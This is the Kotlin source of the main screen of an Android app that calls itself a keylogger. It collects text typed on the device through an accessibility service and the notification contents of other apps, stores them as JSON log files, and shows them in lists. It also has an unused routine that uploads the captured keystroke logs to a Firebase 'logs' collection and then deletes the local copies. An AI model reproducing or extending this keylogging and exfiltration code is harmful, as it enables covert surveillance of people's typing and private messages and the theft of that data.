package com.azamovhudstc.androidkeylogger.activity

import android.annotation.SuppressLint
import android.content.*
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Bundle
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import androidx.lifecycle.MutableLiveData
import androidx.recyclerview.widget.RecyclerView
import com.azamovhudstc.androidkeylogger.adapter.LogAdapter
import com.azamovhudstc.androidkeylogger.adapter.NotificationAdapter
import com.azamovhudstc.androidkeylogger.R
import com.azamovhudstc.androidkeylogger.databinding.ActivityMainBinding
import com.azamovhudstc.androidkeylogger.model.LogModel
import com.azamovhudstc.androidkeylogger.model.NotificationModel
import com.azamovhudstc.androidkeylogger.service.CallRecordingService
import com.azamovhudstc.androidkeylogger.service.SvcAccFix
import com.google.firebase.FirebaseApp
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileWriter
import java.io.IOException
import java.util.Date

class MainFixActivity : AppCompatActivity() {
    private lateinit var recyclerView: RecyclerView
    private lateinit var adapter: NotificationAdapter
    private lateinit var logAdapter: LogAdapter
    private val notifications = mutableListOf<NotificationModel>()
    private val logs = mutableListOf<LogModel>()
    private var isFirstLaunch = true
    private var isNotificationFormat = MutableLiveData<Boolean>(true)
    private val fileName = "notifications1.txt"
    private val fileNameLog = "logs1.txt"
    private lateinit var firestore: FirebaseFirestore
    companion object {
    }

    private var _binding: ActivityMainBinding? = null
    private val binding get() = _binding!!

    private fun checkPermission() {
        if (!SvcAccFix.i) {
            if (!SvcAccFix.j) {
                startActivity(Intent(this, AccessibilityFixActivity::class.java))
            }
        }else {

        }
    }


    private val notificationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val packageName = intent?.getStringExtra("packageName")
            val title = intent?.getStringExtra("title")
            val text = intent?.getStringExtra("text")
            val timeStamp = intent?.getStringExtra("date")
            val timeStampDay = intent?.getStringExtra("dayTime")
            if (!packageName.isNullOrBlank() && !title.isNullOrBlank() && !text.isNullOrBlank()) {
                val notificationModel = NotificationModel(
                    packageName,
                    title,
                    text,
                    timeStamp!!,
                    timeStampDay!!
                )
                adapter.addNotification(notificationModel)

                saveNotificationToFileLocal(notificationModel)



            }
        }
    }

    private val receiver: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val text = intent.getStringExtra("TEXT") ?: ""
            println("TEXTTTTTTTTTTT :${text}")
            val packageName = intent.getStringExtra("PACKAGE_NAME") ?: ""
            val dayTime = intent.getStringExtra("DAY_TIME") ?: ""
            val timeStamp = intent.getStringExtra("TIME_STAMP") ?: ""
            val batteryLevel = intent.getStringExtra("BATTERY_LEVEL") ?: ""
            val notificationModel = LogModel(
                text,
                packageName,
                dayTime!!,
                timeStamp!!, batteryLevel
            )
            Log.d("EVENT", "onAccessibilityEventTAAAAAAA: ${text.toString()}")
            logAdapter.addNotification(notificationModel)
            saveLogToFileLocal(notificationModel)

        }
    }

    private fun saveNotificationToFileLocal(notification: NotificationModel) {
        val gson = Gson()
        val notificationJson = gson.toJson(notification)

        try {
            val file = File(filesDir, fileName)
            FileWriter(file, true).use { writer ->
                writer.append(notificationJson)
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun saveLogToFileLocal(notification: LogModel) {
        val gson = Gson()
        val notificationJson = gson.toJson(notification)

        try {
            val file = File(filesDir, fileNameLog)
            FileWriter(file, true).use { writer ->
                writer.append(notificationJson)
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    @SuppressLint("SuspiciousIndentation")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        FirebaseApp.initializeApp(this)
        println("FIREBASE APP NAME :"+FirebaseApp.getInstance().name)
        firestore = FirebaseFirestore.getInstance()

        recyclerView = findViewById(R.id.notificationRecyclerView)
        // Read data from file upon the first launch
        if (isFirstLaunch) {
            isFirstLaunch = false
            logAdapter = LogAdapter(logs, this)
            adapter = NotificationAdapter(notifications)
            readNotificationsFromFileLocal()
            readLogFromFileLocal()

        }


        val filter = IntentFilter("com.azamovhudstc.androidkeylogger.NOTIFICATION_LISTENER")
        registerReceiver(notificationReceiver, filter)
        registerReceiver(receiver, IntentFilter("ACTION_TEXT_RECEIVED"))



        isNotificationFormat.observe(this) {
            if (it) {
                adapter.clearAdapterData()
                readNotificationsFromFileLocal()
                if (notifications.isEmpty()) {
                    binding.isEmpty.isVisible = true
                    binding.isEmpty.text = "Notification Page"
                } else binding.isEmpty.isVisible = false
                recyclerView.adapter = adapter
                binding.notificationRecyclerView.isVisible = true
                binding.typingLoggerRecycler.isVisible = false

            } else {

                logAdapter.clearAdapterData()
                readLogFromFileLocal()
                if (logs.isEmpty()) {
                    binding.isEmpty.isVisible = true
                    binding.isEmpty.text = "Logs Page"
                } else binding.isEmpty.isVisible = false
                binding.typingLoggerRecycler.adapter = logAdapter
                binding.typingLoggerRecycler.isVisible = true
                binding.notificationRecyclerView.isVisible = false
            }
        }

    }

    private fun readNotificationsFromFileLocal() {
        val file = File(filesDir, fileName)
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()
                val savedNotifications = mutableListOf<NotificationModel>()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, NotificationModel::class.java)
                    savedNotifications.add(notificationModel)
                }
                reader.close()

                notifications.addAll(savedNotifications)
                adapter.notifyDataSetChanged()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }


    private fun deleteLogFromLocalFile(log: LogModel) {
        val file = File(filesDir, fileNameLog)
        val tempList = mutableListOf<LogModel>()
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()

                // Avvalgi loglar bilan to'g'ri kelgan logni o'chirish
                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, LogModel::class.java)
                    if (notificationModel != log) {
                        tempList.add(notificationModel)
                    }
                }
                reader.close()

                // Faylni tozalash
                file.delete()

                // Yangi ma'lumotlarni faylga yozish
                val writer = FileWriter(file, true)
                tempList.forEach { tempLog ->
                    val logJson = gson.toJson(tempLog)
                    writer.append(logJson)
                    writer.append("\n")
                }
                writer.close()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }


    private fun isNetworkFastEnough(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(network)
        return capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ?: false &&
                (capabilities?.linkDownstreamBandwidthKbps
                    ?: 0) >= 14_000 // Minimum required speed for H+ network
    }

    private fun isLocalLogsAvailable(): Boolean {
        val file = File(filesDir, fileNameLog)
        return file.exists()
    }
    private fun isLocalNotificationsAvailable(): Boolean {
        val file = File(filesDir, fileName)
        return file.exists()
    }
    private fun uploadLocalLogsToFirestore() {
        val file = File(filesDir, fileNameLog)
        if (file.exists()) {
            val gson = Gson()
            val logsToUpload = mutableListOf<LogModel>()

            file.bufferedReader().useLines { lines ->
                lines.forEach { line ->
                    val logModel = gson.fromJson(line, LogModel::class.java)
                    logsToUpload.add(logModel)
                }
            }

            val dataCollection = firestore.collection("logs")

            GlobalScope.launch(Dispatchers.IO) {
                logsToUpload.forEach { log ->
                    // Tekshirib chiqamiz, agar "text" Firebase'da mavjud bo'lsa
                    dataCollection.whereEqualTo("text", log.text).get()
                        .addOnSuccessListener { querySnapshot ->
                            // Agar tekshirish natijasida bitta qator ham topilsa
                            if (!querySnapshot.isEmpty) {
                                // Faqat bitta qator qoldiramiz va o'chirib tashlaymiz
                                val document = querySnapshot.documents.first()
                                document.reference.delete()
                            }
                            // Logni Firebase'ga yuboramiz
                            dataCollection.add(log)
                                .addOnSuccessListener {
                                    deleteLogFromLocalFile(log)
                                }
                                .addOnFailureListener { e ->
                                    Log.d("EVENT", "sendLogToFirestore: ${e.message}")
                                    // Xatolikni qayta qarash
                                }
                        }
                }
            }
        }
    }

    private fun readLogFromFileLocal() {
        val file = File(filesDir, fileNameLog)
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()
                val savedNotifications = mutableListOf<LogModel>()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, LogModel::class.java)
                    savedNotifications.add(notificationModel)
                }
                reader.close()

                logs.addAll(savedNotifications)
                adapter.notifyDataSetChanged()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }

    override fun onOptionsItemSelected(menuItem: MenuItem): Boolean {
        when (menuItem.itemId) {
            R.id.actionChangeType -> {
                isNotificationFormat.postValue(!isNotificationFormat.value!!)
            }
        }
        return super.onOptionsItemSelected(menuItem)
    }

    private fun isInternetAvailable(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }


    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.btn, menu)
        return true
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    override fun onResume() {
        super.onResume()
        checkPermission()

    }

}
